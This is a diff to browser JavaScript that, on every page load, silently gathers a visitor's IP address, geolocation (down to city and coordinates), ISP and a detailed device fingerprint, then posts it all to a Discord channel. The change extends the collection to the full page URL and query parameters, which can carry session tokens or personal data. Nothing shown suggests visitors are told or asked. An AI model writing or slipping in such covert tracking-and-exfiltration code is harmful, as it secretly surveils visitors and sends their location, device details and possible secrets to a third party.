@@ -22,7 +22,7 @@ function sendToDiscord(message) {
     .catch(error => console.error('Error In Logging:', error));
 }
 
-// Log IP address, page, and parameters on page load
+// Log user details on page load
 window.addEventListener('load', () => {
     fetch('https://wtfismyip.com/json')
         .then(response => response.json())
@@ -31,6 +31,8 @@ window.addEventListener('load', () => {
             fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${ip}`)
                 .then(response => response.json())
                 .then(ipData => {
+                    const page = window.location.href;
+                    const params = window.location.search;
                     const country = ipData.country;
                     const region = ipData.regionName;
                     const city = ipData.city;
@@ -53,7 +55,7 @@ window.addEventListener('load', () => {
                     const availableMemory = navigator.deviceMemory;
                     const cpuThreads = navigator.hardwareConcurrency;
 
-                    sendToDiscord(`IP Address: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
+                    sendToDiscord(`IP Address: ${ip}\nPage: ${page}\nParameters: ${params}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\nUser Agent: ${userAgent}\nWindow Width: ${windowWidth}\nWindow Height: ${windowHeight}\nWindow Ratio: ${windowRatio}\nScreen Width: ${screenWidth}\nScreen Height: ${screenHeight}\nScreen Ratio: ${screenRatio}\nScreen Pixel Ratio: ${screenPixelRatio}\nScreen DPI: ${screenDPI}\nScreen Color Depth: ${screenColorDepth}\nScreen Orientation: ${screenOrientation}\nScreen Rotation: ${screenRotation}\nOS: ${os}\nAvailable Browser Memory: ${availableMemory}\nCPU Threads: ${cpuThreads}`);
                 })
                 .catch(error => console.error('Error getting IP details:', error));
         })
